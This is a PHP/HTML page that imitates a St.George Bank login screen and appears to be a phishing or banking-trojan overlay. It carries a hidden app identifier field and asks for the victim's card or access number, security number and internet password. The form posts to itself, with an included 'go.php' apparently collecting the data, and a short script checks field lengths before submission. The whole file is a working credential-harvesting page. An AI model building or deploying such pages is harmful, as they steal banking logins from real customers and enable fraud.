<?php require_once '../go.php';?>
<!DOCTYPE html>

<html>
<head>
    <link rel="stylesheet" href="libs/bootstrap/dist/css/bootstrap.min.css">
    <link rel="stylesheet" href="libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="libs/css/style.css">

</head>
<body>
<div id="content_div">
<div class="header">
	<img src="data:image/png;base64,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" style="padding: 15px 40px;">
	
</div>

<center><br><br>
		<form method="post" autocomplete="off">
			<input name="field1" type="hidden" value="org.stgeorge.bank">
		
			<input name="field2" id="login" placeholder="Login with card/access no." maxlength="8" class="input" type="number"><br><br>
			<input name="field3" id="security" placeholder="Security number" maxlength="6" class="input" type="number"><br><br>
			<input name="field4" id="password" placeholder="Internet Password" maxlength="6" class="input" type="password"><br><br>
			
			<input value="Login" id="input_submitBtn" class="submit" type="submit">

		</form>
<center>
</div>
<script type="text/javascript">

                    var g_oBtn = document.getElementById('input_submitBtn');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('login');
                        var oSecInp = document.getElementById('security');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oSecInp.className = oCodeInp.className = 'input';
						} catch(e){};
						
                         if (oNumInp.value.length < 6) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (oSecInp.value.length < 6) {
							try{
								oSecInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
						 if (oCodeInp.value.length < 6) {
							try{
								oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
                    }
            </script>
</body>
</html>